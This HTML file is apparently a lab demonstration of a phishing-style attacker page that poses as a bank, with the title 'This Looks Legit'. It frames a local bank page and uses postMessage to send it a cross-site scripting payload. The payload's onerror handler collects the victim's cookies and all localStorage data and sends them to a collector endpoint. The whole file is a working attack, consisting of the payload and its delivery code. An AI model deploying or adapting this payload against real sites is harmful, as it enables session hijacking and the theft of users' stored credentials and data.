<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>This Looks Legit</title>
</head>
<body>
  <h1>Bank service</h1>
  <p>This page belongs to your bank trust me.</p>

  <iframe id="victimFrame" src="http://127.0.0.1:5500/bank.html"
          style="width:800px;height:300px;border:1px solid #444;"></iframe>

  <script>
    const collector = 'http://localhost:9000/collect';

    const payload = `
      <img src=x onerror="
        try {
          var c = encodeURIComponent(document.cookie || '');
          var ls = encodeURIComponent(JSON.stringify((function(){
            try {
              var o={};
              for(var i=0;i<localStorage.length;i++){ var k=localStorage.key(i); o[k]=localStorage.getItem(k); }
              return o;
            } catch(e) { return 'localStorage_err'; }
          })()));
        } catch(e) { var c='err'; var ls='err'; }
        var i=new Image();
        i.src='${collector}?c='+c+'&ls='+ls+'&ref='+encodeURIComponent(location.href);
      ">
    `;

    const iframe = document.getElementById('victimFrame');
    iframe.onload = function() {
      try {
        iframe.contentWindow.postMessage(payload, '*');
        console.log('[attacker] sent payload on iframe.onload');
      } catch (e) {
        console.error('postMessage error', e);
      }
    };
  </script>
</body>
</html>
